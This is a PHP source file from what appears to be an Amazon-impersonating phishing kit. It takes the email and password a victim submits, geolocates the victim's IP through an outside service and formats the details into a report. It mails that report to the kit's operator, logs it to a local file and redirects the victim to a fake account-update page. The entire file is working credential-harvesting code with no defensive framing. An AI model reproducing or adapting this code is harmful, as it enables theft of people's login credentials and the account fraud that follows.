<?php 
##############################################################################################################################################################
		session_start();
		include('../bots.php');
		include('../config.php');
##############################################################################################################################################################
        $IP = $_SERVER['REMOTE_ADDR'];
        date_default_timezone_set('UTC');
        $DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$IP."");
        $COUNTRYCODE = $DETAILS->geoplugin_countryCode;
        $COUNTRYNAME = $DETAILS->geoplugin_countryName;
        $STRTCODE    = strtolower($COUNTRYCODE);
##############################################################################################################################################################
		$EMAIL = $_POST['email'];
		$PASSWORD = $_POST['password'];
##############################################################################################################################################################
		$MESSAGE="<div style='font-size:13px;font-family:monospace'>";
		$MESSAGE.="<b>DEAR, <font color='#cc1414'>".$PRONAME."</font></b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>EMAIL</font></b>           :<b>".$_POST['email']."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>PASSWORD</font></b>        :<b>".$_POST['password']."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>IP</font></b>              :<a href='http://ip-api.com/$IP' target='_blank'>$IP</a> <br>";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>COUNTRY</font></b>         : <b> ".$COUNTRYNAME." - ".$COUNTRYCODE." </b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>BROWSER & OS</font></b>    : <b>".$device_details."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>TIME</font></b>            : <b>".date('l jS \of F Y h:i:s A')."</b> <br></div>\n";
		$MESSAGE = wordwrap($MESSAGE,70);
##############################################################################################################################################################
		$SUBJECT = "(AMAZON)(LOGIN)($IP)($COUNTRYNAME)";
		$HEADER = "MIME-Version: 1.0" . "\r\n";
		$HEADER .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$HEADER .= "From: MOBILE VERSION ☑  <LOG_$IP>\n";
		mail($TO,$SUBJECT,$MESSAGE,$HEADER);
				$file = fopen("../BB/LOGIN_$IP.html","a");
fwrite($file,$MESSAGE);
		$CODED  ="details.php?cmd=_update-information&account_biling=".md5(microtime())."&lim_session=".sha1(microtime());
        header("Location: $CODED");
##############################################################################################################################################################
?>